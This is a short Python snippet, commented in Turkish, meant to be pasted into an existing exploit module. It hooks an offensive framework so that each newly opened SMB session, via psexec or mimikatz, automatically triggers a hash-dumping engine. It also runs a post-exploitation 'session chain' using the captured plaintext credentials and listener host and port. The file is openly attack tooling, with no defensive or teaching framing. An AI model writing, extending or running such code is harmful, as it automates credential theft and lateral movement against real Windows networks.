# Mevcut exploit modülünüzün içine ekleyin

from cybermodules.hashdump import HashDumpEngine


def on_crack_session_opened(scan_id, session_info):
    """
    CrackSession açıldığında otomatik olarak çağrılır
    Session info örneği:
    {
        'target': '10.10.10.100',
        'username': 'administrator',
        'password': 'AdminPass123!',
        'domain': 'CORP',
        'protocol': 'smb',
        'session_type': 'psexec/mimikatz/exec'
    }
    """
    engine = HashDumpEngine(scan_id, session_info)
    
    result = engine.execute_session_hook()
    
    return result


def trigger_hashdump_after_session(scan_id, target, username, password, domain=""):
    """
    Manuel olarak hashdump workflow başlat
    """
    session_info = {
        "target": target,
        "username": username,
        "password": password,
        "domain": domain
    }
    
    return on_crack_session_opened(scan_id, session_info)


# Mevcut exploit modülünüze ekleyin

from cybermodules.session_hooks import execute_session_chain


class CrackSession:
    """Existing session class - add hook to on_open"""
    
    def open(self, target, credentials):
        # ... existing code ...
        
        # Add session hook after successful connection
        detect_os = getattr(self, "detect_os", None)
        os_name = detect_os(target) if callable(detect_os) else "unknown"
        session_info = {
            "target": target,
            "username": credentials.get("username"),
            "password": credentials.get("password"),
            "domain": credentials.get("domain", ""),
            "lhost": getattr(self, "lhost", ""),
            "lport": getattr(self, "lport", 0),
            "os": os_name,
            "protocol": "smb"
        }
        
        # Auto-execute session chain
        chain_result = execute_session_chain(getattr(self, "scan_id", 0), session_info)
        
        return session_info, chain_result
